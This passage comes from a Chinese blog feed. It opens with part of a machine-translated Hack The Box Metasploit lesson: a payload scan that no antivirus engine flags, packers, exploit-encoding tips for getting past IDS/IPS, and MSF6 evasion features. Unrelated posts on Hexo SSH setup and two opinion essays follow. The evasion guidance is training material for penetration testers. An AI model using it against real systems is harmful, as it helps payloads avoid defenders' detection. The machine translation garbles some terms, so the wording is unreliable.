another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">=================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version         Result  Update</span><br><span class="line"> ---------             --------  -------         ------  ------</span><br><span class="line"> ALYac                 false     1.1.3.1                 20220510</span><br><span class="line"> Acronis               false     1.2.0.108               20220426</span><br><span class="line"> Ad-Aware              false     3.0.21.193              20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230            20220510</span><br><span class="line"> Antiy-AVL             false     3.0                     20220510</span><br><span class="line"> Arcabit               false     1.0.0.889               20220510</span><br><span class="line"> Avira                 false     8.3.3.14                20220510</span><br><span class="line"> BitDefender           false     7.2                     20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0             20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899              20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                   20220510</span><br><span class="line"> CMC                   false     2.10.2019.1             20211026</span><br><span class="line"> ClamAV                false     0.105.0.0               20220509</span><br><span class="line"> Comodo                false     34606                   20220509</span><br><span class="line"> Cynet                 false     4.0.0.27                20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                 20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040             20220510</span><br><span class="line"> ESET-NOD32            false     25243                   20220510</span><br><span class="line"> Emsisoft              false     2021.5.0.7597           20220510</span><br><span class="line"> F-Secure              false     18.10.978.51            20220510</span><br><span class="line"> FireEye               false     35.24.1.0               20220510</span><br><span class="line"> Fortinet              false     6.2.142.0               20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174              20220510</span><br><span class="line"> Jiangmin              false     16.0.100                20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275             20220510</span><br><span class="line"> K7GW                  false     12.12.42275             20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565           20220510</span><br><span class="line"> Lionic                false     7.5                     20220510</span><br><span class="line"> MAX                   false     2019.9.16.1             20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                 20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728          20220510</span><br><span class="line"> MicroWorld-eScan      false     14.0.409.0              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588           20220510</span><br><span class="line"> Panda                 false     4.6.4.2                 20220509</span><br><span class="line"> Rising                false     25.0.0.27               20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032              20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                20220507</span><br><span class="line"> Symantec              false     1.17.0.0                20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02           20220510</span><br><span class="line"> Tencent               false     1.0.0.1                 20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040             20220510</span><br><span class="line"> VBA32                 false     5.0.0                   20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0             20220510</span><br><span class="line"> VirIT                 false     9.5.191                 20220509</span><br><span class="line"> Yandex                false     5.5.2.24                20220428</span><br><span class="line"> Zillya                false     2.0.0.4627              20220509</span><br><span class="line"> ZoneAlarm             false     1.0                     20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                 20220509</span><br></pre></td></tr></table></figure><p><code>to</code>正如我们从上面看到的那样，这是一种在目标主机和目标主机之间传输数据的好方法<code>from</code>。</p><hr><h2 id="包装工"><a href="#包装工" class="headerlink" title="包装工"></a>包装工</h2><p>该术语指的是有效负载与可执行程序和解压缩代码一起打包在一个文件中的过程<code>Packer</code>的结果。<code>executable compression</code>运行时，解压缩代码将后门可执行文件返回到其原始状态，从而为目标主机上的文件扫描机制提供另一层保护。此过程透明地发生，以便压缩的可执行文件以与原始可执行文件相同的方式运行，同时保留所有原始功能。此外，msfvenom 还提供压缩和更改后门可执行文件的文件结构以及加密底层进程结构的能力。</p><p>流行的加壳软件列表：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://upx.github.io/">UPX封隔器</a></td><td><a href="https://enigmaprotector.com/">谜保护者</a></td><td><a href="https://www.matcode.com/mpress.htm">国会议员</a></td></tr><tr><td>备用 EXE 打包程序</td><td>执行隐身</td><td>吗啡</td></tr><tr><td>水电部</td><td>泰米达</td><td></td></tr></tbody></table><p>如果我们想了解有关打包器的更多信息，请查看<a href="https://jon.oberheide.org/files/woot09-polypack.pdf">PolyPack 项目</a>。</p><hr><h2 id="利用编码"><a href="#利用编码" class="headerlink" title="利用编码"></a>利用编码</h2><p>在编写我们的漏洞利用程序或将预先存在的漏洞利用程序移植到框架时，最好确保利用目标系统上实施的安全措施不容易识别漏洞利用代码。</p><p>例如，<code>Buffer Overflow</code>由于其十六进制缓冲区模式，典型的漏洞可能很容易与通过网络传输的常规流量区分开来。IDS &#x2F; IPS 部署可以检查流向目标机器的流量，并注意到用于利用代码的特定过度使用模式。</p><p>在组装我们的漏洞利用代码时，随机化有助于为这些模式添加一些变化，这将破坏众所周知的漏洞利用缓冲区的 IPS &#x2F; IDS 数据库签名。<code>Offset</code>这可以通过在 msfconsole 模块的代码中输入一个开关来完成：</p><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;Targets&#x27;</span> =&gt;</span><br><span class="line">[</span><br><span class="line"> [ <span class="string">&#x27;Windows 2000 SP4 English&#x27;</span>, &#123; <span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x77e14c29</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">5093</span> &#125; ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>除了 BoF 代码之外，应该始终避免使用明显的 NOP sled，在溢出完成后 shellcode 应该着陆的地方。请注意，BoF 代码的目的是使目标机器上运行的服务崩溃，而 NOP sled 是插入我们的 shellcode（有效负载）的分配内存。IPS&#x2F;IDS 实体会定期检查这两者，因此最好在将我们的自定义漏洞代码部署到客户端网络之前针对沙箱环境测试它。当然，我们可能只有一次机会在评估期间正确地做到这一点。</p><p>有关利用代码的更多信息，我们建议您查看No Starch 出版社的<a href="https://nostarch.com/metasploit">Metasploit - 渗透测试指南。</a>他们深入研究了有关为框架创建漏洞的一些细节。</p><hr><h2 id="从源代码重新编译-Meterpreter"><a href="#从源代码重新编译-Meterpreter" class="headerlink" title="从源代码重新编译 Meterpreter"></a>从源代码重新编译 Meterpreter</h2><p>入侵防御系统和防病毒引擎是最常见的防御工具，可以击落目标的初始立足点。这些主要作用于整个恶意文件或存根阶段的签名。</p><hr><h2 id="关于逃避的注意事项"><a href="#关于逃避的注意事项" class="headerlink" title="关于逃避的注意事项"></a>关于逃避的注意事项</h2><p>本节涵盖高级别的规避。请留意后面的模块，这些模块将更深入地挖掘更有效地执行规避所需的理论和实践知识。值得在较旧的 HTB 机器上尝试其中的一些技术，或者安装带有较旧版本的 Windows Defender 或免费 AV 引擎的 VM，并练习规避技巧。这是一个庞大的主题，无法在单个部分中充分涵盖。</p><p><a href="https://academy.hackthebox.com/module/39/section/418">以前的</a>标记完成和下一步<a href="https://academy.hackthebox.com/module/39/section/493">下一个</a></p><p>备忘单</p><h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h6><p><a href="https://academy.hackthebox.com/module/39/section/381">前言</a><a href="https://academy.hackthebox.com/module/39/section/383">Metasploit简介</a><a href="https://academy.hackthebox.com/module/39/section/384">MSF控制台介绍</a></p><h6 id="MSF-组件"><a href="#MSF-组件" class="headerlink" title="MSF 组件"></a>MSF 组件</h6><p><a href="https://academy.hackthebox.com/module/39/section/404"> 模块</a><a href="https://academy.hackthebox.com/module/39/section/408">目标</a><a href="https://academy.hackthebox.com/module/39/section/407"> 有效载荷</a><a href="https://academy.hackthebox.com/module/39/section/409">编码器</a><a href="https://academy.hackthebox.com/module/39/section/411">数据库</a><a href="https://academy.hackthebox.com/module/39/section/413">插件和混合</a></p><h6 id="无国界医生会议"><a href="#无国界医生会议" class="headerlink" title="无国界医生会议"></a>无国界医生会议</h6><p><a href="https://academy.hackthebox.com/module/39/section/415"> 会议和工作</a><a href="https://academy.hackthebox.com/module/39/section/414"> 计价器</a></p><h6 id="附加功能"><a href="#附加功能" class="headerlink" title="附加功能"></a>附加功能</h6><p><a href="https://academy.hackthebox.com/module/39/section/417">编写和导入模块</a><a href="https://academy.hackthebox.com/module/39/section/418">MSF毒液简介</a><a href="https://academy.hackthebox.com/module/39/section/416">防火墙和 IDS&#x2F;IPS 规避</a><a href="https://academy.hackthebox.com/module/39/section/493">Metasploit 框架更新 - 2020 年 8 月</a></p><h5 id="我的工作站"><a href="#我的工作站" class="headerlink" title="我的工作站"></a>我的工作站</h5><h1 id="Metasploit-框架更新-2020-年-8-月"><a href="#Metasploit-框架更新-2020-年-8-月" class="headerlink" title="Metasploit 框架更新 - 2020 年 8 月"></a>Metasploit 框架更新 - 2020 年 8 月</h1><hr><p>更新到 MSF6 将使所有以前的负载会话无法使用（如果它们是使用 MSF5 建立的）。此外，使用 MSF5 生成的有效负载将不适用于 MSF6 通信机制。我们在下面总结了 2020 年 8 月 MSF 控制台更新带来的更改和添加。</p><hr><h2 id="生成特征"><a href="#生成特征" class="headerlink" title="生成特征"></a>生成特征</h2><ul><li>所有五种实现（Windows、Python、Java、Mettle 和 PHP）的跨 Meterpreter 会话的端到端加密</li><li>SMBv3 客户端支持以进一步启用现代开发工作流程</li><li>Windows shellcode 的新多态负载生成例程，可提高针对常见防病毒和入侵检测系统 (IDS) 产品的规避能力</li></ul><hr><h2 id="扩展加密"><a href="#扩展加密" class="headerlink" title="扩展加密"></a>扩展加密</h2><ul><li>为某些网络操作和 Metasploit 的主要有效载荷二进制文件创建基于签名的检测的复杂性增加</li><li>在攻击者和目标系统之间的通信期间，所有 Meterpreter 有效负载将使用 AES 加密</li><li>SMBv3 加密集成将增加用于识别通过 SMB 执行的关键操作的基于签名的检测的复杂性</li></ul><hr><h2 id="更清洁的有效载荷工件"><a href="#更清洁的有效载荷工件" class="headerlink" title="更清洁的有效载荷工件"></a>更清洁的有效载荷工件</h2><ul><li>Windows Meterpreter 使用的 DLL 现在通过序号而不是名称解析必要的函数</li><li>反射加载 DLL 使用的标准导出 ReflectiveLoader 不再作为文本数据出现在负载二进制文件中</li><li>Meterpreter 向框架公开的命令现在被编码为整数而不是字符串</li></ul><hr><h2 id="插件-2"><a href="#插件-2" class="headerlink" title="插件"></a>插件</h2><p>旧的 Mimikatz Meterpreter 扩展被移除，取而代之的是它的继任者 Kiwi。因此，在可预见的未来，加载 Mimikatz 的尝试将加载 Kiwi。</p><hr><h2 id="有效载荷-1"><a href="#有效载荷-1" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>将 shellcode 静态生成例程替换为随机化例程，该例程通过每次随机化指令向该关键存根添加多态属性。要阅读有关这些更改的更多信息并查看完整的更改日志，请<a href="https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/">点击此链接</a>。</p><hr><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>正如我们在本模块中看到的，Metasploit 是一个强大的框架。虽然经常被误用和贴错标签，但如果使用得当，它可以成为我们渗透测试武器库的重要组成部分。它具有高度可扩展性，非常适合在评估期间跟踪数据，并且非常适合后期开发和促进枢转。值得尝试 Metasploit 提供的所有功能；您可能会找到一种非常适合您的工作流程的方式。如果你想避免它，那也没关系！那里有很多工具，我们应该使用我们最熟悉的工具。要使用此工具进行更多练习，请查看本模块末尾标记的 HTB 盒子，或使用 Metasploit 尝试任何盒子或 Academy 模块目标。您还可以在 Dante Pro Lab 中练习它（尤其是它的旋转能力）。</p><p><a href="https://academy.hackthebox.com/module/39/section/416">以前的</a>结束</p><p>备忘单</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文来源：&lt;a href=&quot;https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/&quot;&gt;https://zengqi0.github.i</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://jiangnanpsalter.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="http://jiangnanpsalter.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/HTB/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo使用SSH连接GitHub</title>
    <link href="http://jiangnanpsalter.com/2024/04/09/Hexo%E4%BD%BF%E7%94%A8SSH%E8%BF%9E%E6%8E%A5GitHub/"/>
    <id>http://jiangnanpsalter.com/2024/04/09/Hexo%E4%BD%BF%E7%94%A8SSH%E8%BF%9E%E6%8E%A5GitHub/</id>
    <published>2024-04-09T15:06:30.131Z</published>
    <updated>2024-04-09T15:24:54.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo使用SSH连接GitHub"><a href="#Hexo使用SSH连接GitHub" class="headerlink" title="Hexo使用SSH连接GitHub"></a>Hexo使用SSH连接GitHub</h1><p>步骤：</p><h2 id="1-设置全局变量"><a href="#1-设置全局变量" class="headerlink" title="1.设置全局变量"></a>1.设置全局变量</h2><h3 id="查看Git环境所有配置"><a href="#查看Git环境所有配置" class="headerlink" title="查看Git环境所有配置"></a>查看Git环境所有配置</h3><p>Win+R打开命令行窗口，并输入以下代码：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure><p>如果没有配置<code>user.name</code>和<code>user.email</code>则需要先配置</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;用户名随意&quot;</span><br><span class="line">git config --global user.email  &quot;<span class="number">123456</span>@qq.com&quot; #填写github注册的邮箱</span><br></pre></td></tr></table></figure><h2 id="2-查看SSH-Key"><a href="#2-查看SSH-Key" class="headerlink" title="2.查看SSH Key"></a>2.查看SSH Key</h2><p>在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh </span><br><span class="line">ls </span><br></pre></td></tr></table></figure><h2 id="3-生成密钥"><a href="#3-生成密钥" class="headerlink" title="3.生成密钥"></a>3.生成密钥</h2><p>在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat id_rsa.pub #查看公钥并复制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;你的github邮箱&quot; #没有的话执行此命令生成公钥和私钥</span><br></pre></td></tr></table></figure><h2 id="4-复制密钥到github"><a href="#4-复制密钥到github" class="headerlink" title="4.复制密钥到github"></a>4.复制密钥到github</h2><p>打开github，点击setting &gt;SSH and GPG keys &gt;New SSH key，取个名字，粘贴密钥即可</p><p>验证是否配置成功:在电脑桌面上Git Bush，输入以下命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com #打开git bash输入此命令，显示successful表示成功</span><br></pre></td></tr></table></figure><p>修改hexo的配置文件.config.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:   #部署部分的设置</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:你的用户名/你的仓库名.git  #设置仓库为ssh格式</span><br><span class="line">  branch: master </span><br></pre></td></tr></table></figure><p>再次通过hexo g -d 提交博客代码时就不用输入密码了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo使用SSH连接GitHub&quot;&gt;&lt;a href=&quot;#Hexo使用SSH连接GitHub&quot; class=&quot;headerlink&quot; title=&quot;Hexo使用SSH连接GitHub&quot;&gt;&lt;/a&gt;Hexo使用SSH连接GitHub&lt;/h1&gt;&lt;p&gt;步骤：&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://jiangnanpsalter.com/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="http://jiangnanpsalter.com/tags/Hexo/"/>
    
    <category term="GitHub" scheme="http://jiangnanpsalter.com/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>美丽女生的明智选择：远离娱乐直播，追求实绩人生</title>
    <link href="http://jiangnanpsalter.com/2024/04/09/%E7%BE%8E%E4%B8%BD%E5%A5%B3%E7%94%9F%E7%9A%84%E6%98%8E%E6%99%BA%E9%80%89%E6%8B%A9%EF%BC%9A%E8%BF%9C%E7%A6%BB%E5%A8%B1%E4%B9%90%E7%9B%B4%E6%92%AD%EF%BC%8C%E8%BF%BD%E6%B1%82%E5%AE%9E%E7%BB%A9%E4%BA%BA%E7%94%9F/"/>
    <id>http://jiangnanpsalter.com/2024/04/09/%E7%BE%8E%E4%B8%BD%E5%A5%B3%E7%94%9F%E7%9A%84%E6%98%8E%E6%99%BA%E9%80%89%E6%8B%A9%EF%BC%9A%E8%BF%9C%E7%A6%BB%E5%A8%B1%E4%B9%90%E7%9B%B4%E6%92%AD%EF%BC%8C%E8%BF%BD%E6%B1%82%E5%AE%9E%E7%BB%A9%E4%BA%BA%E7%94%9F/</id>
    <published>2024-04-09T14:51:11.473Z</published>
    <updated>2024-04-09T14:57:55.854Z</updated>
    
    <content type="html"><![CDATA[<h1 id="美丽女生的明智选择：远离娱乐直播，追求实绩人生"><a href="#美丽女生的明智选择：远离娱乐直播，追求实绩人生" class="headerlink" title="美丽女生的明智选择：远离娱乐直播，追求实绩人生"></a>美丽女生的明智选择：远离娱乐直播，追求实绩人生</h1><p>在现今社会，网络直播平台如雨后春笋般崛起，许多年轻貌美的女生纷纷投身其中，试图通过娱乐直播行业谋求一份收入。然而，长相底子好或天生貌美的女生，真的适合走这条路吗？我们可以从以下几个方面来思考这个问题。</p><p>首先，长相优越的女生在直播平台上容易成为众人瞩目的焦点，收获众多粉丝和打赏。然而，我们需要明白，观众为女主播付出的金钱和时间背后，往往<code>隐藏着目的性和期望</code>。很多人对女主播的喜欢并非纯粹，他们或许期待与女主播建立更进一步的关系，甚至有人企图借此机会靠近美女。这使得女主播容易陷入财务纠纷，甚至面临生命威胁。因此，对于长相底子好且家世好的女生来说，选择娱乐直播行业并非明智之举。</p><p>其次，<code>女主播的身份并不光彩</code>。虽然现代社会倡导性别平等，但女主播的身份地位实际上与古代的歌舞伎并无太大差别。她们依赖外貌吸引观众，很难获得真正的尊重和认同。在这种情况下，女生为何不把天生的优势用在更有意义的事情上呢？</p><p>再者，<code>长相优越、成绩也不差的女生</code>，更应该在<code>学术和工作上</code>有所追求。例如成为一名公务员、企业主管或经理等，这些职业不仅能为她们带来稳定的收入，还能让她们在<code>社会地位</code>上得到提升。相较于直播行业，这些职业更能让她们<code>实现自我价值</code>。</p><p>最后，我们要认识到，容貌终究会随着时间的推移而消逝，唯有<code>实绩和能力</code>才能陪伴我们一生。尽管在社交平台上发布美丽的照片会收获无数点赞，但我们应<code>一笑而过</code>，<code>淡然看待</code>这些虚荣。将重心放在<code>学术和工作</code>上，才是<code>真正</code>能为我们<code>创造价值</code>、带来<code>实际正向利益</code>的途径。</p><p>总之，对于<code>长相底子好且聪明</code>或<code>天生貌美且家世好</code>的女生来说，选择娱乐直播行业并非最佳方案。她们应当珍惜自己的<code>优势</code>，远离娱乐主播行业的是是非非，积极追求学术和具备实际社会地位的工作上的<code>实绩人生</code>，为社会<code>贡献自己的力量</code>。唯有如此，她们才能真正<code>实现人生价值</code>，过上<code>光彩照人</code>的生活。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;美丽女生的明智选择：远离娱乐直播，追求实绩人生&quot;&gt;&lt;a href=&quot;#美丽女生的明智选择：远离娱乐直播，追求实绩人生&quot; class=&quot;headerlink&quot; title=&quot;美丽女生的明智选择：远离娱乐直播，追求实绩人生&quot;&gt;&lt;/a&gt;美丽女生的明智选择：远离娱乐直播，</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>同频共振：知识背景与团结力量</title>
    <link href="http://jiangnanpsalter.com/2024/04/06/%E5%90%8C%E9%A2%91%E5%85%B1%E6%8C%AF%EF%BC%9A%E7%9F%A5%E8%AF%86%E8%83%8C%E6%99%AF%E4%B8%8E%E5%9B%A2%E7%BB%93%E5%8A%9B%E9%87%8F/"/>
    <id>http://jiangnanpsalter.com/2024/04/06/%E5%90%8C%E9%A2%91%E5%85%B1%E6%8C%AF%EF%BC%9A%E7%9F%A5%E8%AF%86%E8%83%8C%E6%99%AF%E4%B8%8E%E5%9B%A2%E7%BB%93%E5%8A%9B%E9%87%8F/</id>
    <published>2024-04-06T12:37:37.775Z</published>
    <updated>2024-04-09T14:28:33.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同频共振：知识背景与团结力量"><a href="#同频共振：知识背景与团结力量" class="headerlink" title="同频共振：知识背景与团结力量"></a>同频共振：知识背景与团结力量</h1><h2 id="一、同频共振的现象"><a href="#一、同频共振的现象" class="headerlink" title="一、同频共振的现象"></a>一、同频共振的现象</h2><p>共振现象，又称同频共振，是一种在同频条件下，个体之间产生高度共鸣和理解的现象。在同频共振中，参与者<code>具有相似的知识背景</code>、<code>相近的专业技能和水平</code>，这使得他们能够<code>轻松地理解彼此的想法和行为</code>。这种现象在游戏玩家之间尤为明显，因为他们共同经历过相同的游戏过程，掌握相似的游戏技巧。</p><p>当这些具备同频共振的人一起玩游戏时，他们会产生一种<code>独特的沟通方式</code>。这种沟通方式是基于他们对游戏的深刻理解和丰富经验，使得他们在很大程度上不需要言语交流，就能心领神会对方的意图。这种默契源于他们<code>对游戏规则的熟悉</code>、<code>对角色定位的明确</code>以及对<code>对方行为模式的洞察</code>。</p><p>在同频共振的群体中，成员之间的互动往往更加<code>高效</code>。他们可以<code>迅速地分析局势</code>，<code>预判对方的行为</code>，并据此<code>采取相应的行动</code>。这种高效互动使得他们在游戏中更容易取得成功，实现<code>双赢</code>。</p><p>同频共振现象也在其他领域中存在。例如，在职场、学术圈或兴趣爱好中，<code>具备相同背景和技能的人们</code>同样可以形成<code>紧密的合作关系</code>，从而<code>提高工作效率和成果质量</code>。</p><p>在同频共振的现象中，我们可以观察到一种特殊的感觉。这种感觉难以言表，但却是我们识别出同类时会产生的<code>本能反应</code>。例如，<code>学过算法的程序员们</code>具备<code>扎实的计算机基础知识和编程能力</code>、<code>强烈的团队协作精神和沟通能力</code>、<code>优秀的解决问题能力和创新思维</code>。他们能够<code>快速地分析问题</code>，<code>找到解决方案</code>，并<code>在关键时刻提出新颖的解题方法</code>。同样，<code>网络安全领域的人</code>拥有<code>深入的网络安全知识和技能</code>、<code>敏锐的洞察力和风险评估能力</code>、<code>高效的团队协作和沟通能力</code>、<code>持续学习和自我提升意识</code>，以及<code>严谨的职业道德和法律意识</code>。并且，程序员们在谈论算法时，能迅速地找到共同话题，分享彼此的见解和心得。再如，网络安全领域的专家们在交流时，能凭借相同的知识背景迅速理解对方的观点，形成紧密的联系。这些现象都表明，同频共振是基于认知范围、知识背景的交集而产生的。</p><p>当具备共同特点或类似知识背景的同类型人相遇时，他们会在对方身上感受到这种特殊的感觉。这种感觉说不上来，但却是我们识别出同类时会产生的真实感受。正因为这种难以言表的感觉，同类人们更容易团结在一起，齐心协力，实现更大的价值和成就。在同频共振的基础上，人们可以相互支持、共同进步，不断拓展知识的边界，创新思维，为个人和社会的进步贡献力量。</p><p>要<code>实现同频共振</code>，首先需要个体之间的<code>相互理解和尊重</code>。在这个过程中，他们需要花费时间和精力去了解对方的<code>思维方式</code>、<code>行为模式</code>以及<code>价值观</code>。此外，<code>不断丰富自己的知识和技能</code>也是关键，这样才能更好地与他人形成<code>共鸣</code>。</p><h2 id="二、同频共振的原因"><a href="#二、同频共振的原因" class="headerlink" title="二、同频共振的原因"></a>二、同频共振的原因</h2><p>同频共振背后的原因是<code>人类的认知结构和知识体系</code>。人们通过学习、实践和经验积累，形成了各自独特的<code>认知范围</code>和<code>知识背景</code>。当具有相似认知范围和知识背景的人相遇时，他们能更容易地理解对方，产生共鸣。这种共鸣不仅体现在<code>思想交流</code>上，还表现在<code>行为模式、价值观念</code>等方面。</p><h2 id="三、同频共振背后的团结力量"><a href="#三、同频共振背后的团结力量" class="headerlink" title="三、同频共振背后的团结力量"></a>三、同频共振背后的团结力量</h2><p>同频共振为同类人提供了一个<code>相互支持</code>、<code>共同进步</code>的平台。在这个平台上，人们可以共享资源、交流心得，取长补短。这种团结力量具有以下几个特点：</p><h3 id="1-相互理解："><a href="#1-相互理解：" class="headerlink" title="1.  相互理解："></a>1.  相互理解：</h3><p>同类人之间的共鸣让他们更容易理解对方的处境和需求，从而形成<code>深厚的情感纽带</code>。</p><h3 id="2-共同进步："><a href="#2-共同进步：" class="headerlink" title="2.  共同进步："></a>2.  共同进步：</h3><p>在同频共振的基础上，人们可以<code>相互学习、共同成长</code>，实现知识和能力的不断提升。</p><h3 id="3-合作共赢："><a href="#3-合作共赢：" class="headerlink" title="3.  合作共赢："></a>3.  合作共赢：</h3><p>具有相似知识背景的人更容易形成<code>默契</code>，实现<code>团队合作</code>，从而<code>实现共同的目标</code>。</p><h3 id="4-传承创新："><a href="#4-传承创新：" class="headerlink" title="4.  传承创新："></a>4.  传承创新：</h3><p>同频共振使得知识、技能和价值观得以<code>传承和发扬</code>，<code>为人类的进步提供了源源不断的动力</code>。</p><h2 id="四、结论"><a href="#四、结论" class="headerlink" title="四、结论"></a>四、结论</h2><p>同频共振作为一种社会现象，揭示了人类社会中<code>同类相聚</code>、<code>共进共赢</code>的规律。它源于人们的<code>认知范围</code>和<code>知识背景</code>的<code>交集</code>，为同类人提供了一个<code>相互支持、共同进步</code>的平台。在这个平台上，人们可以充分发挥<code>团结力量</code>，实现<code>更大的价值和成就</code>。因此，我们应当重视同频共振的作用，努力寻求与他人的共鸣，以实现<code>个人与社会的共同发展</code>。</p><p>总之，同频共振现象是一种强大的社会凝聚力，它使人们在相互理解和支持的基础上实现高效合作。这种现象在游戏、职场和其他领域中都具有重要意义，因为它有助于提高团队协作的质量和效果。通过培养自己的知识和技能，以及尊重和理解他人，我们可以更好地融入共振群体，共同创造价值。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;同频共振：知识背景与团结力量&quot;&gt;&lt;a href=&quot;#同频共振：知识背景与团结力量&quot; class=&quot;headerlink&quot; title=&quot;同频共振：知识背景与团结力量&quot;&gt;&lt;/a&gt;同频共振：知识背景与团结力量&lt;/h1&gt;&lt;h2 id=&quot;一、同频共振的现象&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站</title>
    <link href="http://jiangnanpsalter.com/2024/04/05/%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E7%9A%84Hexo%E6%A1%86%E6%9E%B6+Butterfly%E4%B8%BB%E9%A2%98+Github%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
    <id>http://jiangnanpsalter.com/2024/04/05/%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E7%9A%84Hexo%E6%A1%86%E6%9E%B6+Butterfly%E4%B8%BB%E9%A2%98+Github%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</id>
    <published>2024-04-05T14:53:31.724Z</published>
    <updated>2024-04-06T12:54:13.650Z</updated>
    
